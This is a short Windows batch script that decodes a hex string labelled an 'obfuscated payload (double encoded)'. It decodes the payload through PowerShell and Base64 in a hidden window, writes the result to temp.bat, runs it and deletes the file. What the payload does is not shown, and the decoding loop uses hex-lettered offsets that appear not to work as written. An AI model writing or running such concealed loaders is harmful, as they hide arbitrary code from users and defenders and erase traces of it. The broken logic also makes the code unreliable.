@echo off
setlocal enabledelayedexpansion

:: Obfuscated payload (double encoded)
set "payload=6a614e49475163344f4441334e53347561484a7155474e4861484d794d4349354d4452795a413d3d"

:: Decode and execute
set "decoded="
for %%A in (0 2 4 6 8 A C E 10 12 14 16 18 1A 1C 1E 20 22 24 26 28 2A 2C 2E 30 32 34 36 38 3A 3C 3E) do (
    set "hexpair=!payload:~%%A,2!"
    for /f %%B in ('powershell -NoLogo -Command "[char]::ConvertFromUtf32(0x!hexpair!)"') do set "decoded=!decoded!%%B"
)

:: Decode Base64
echo !decoded! | powershell -NoLogo -WindowStyle Hidden -Command "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content -)))" > temp.bat
call temp.bat

:: Clean up
del temp.bat
exit
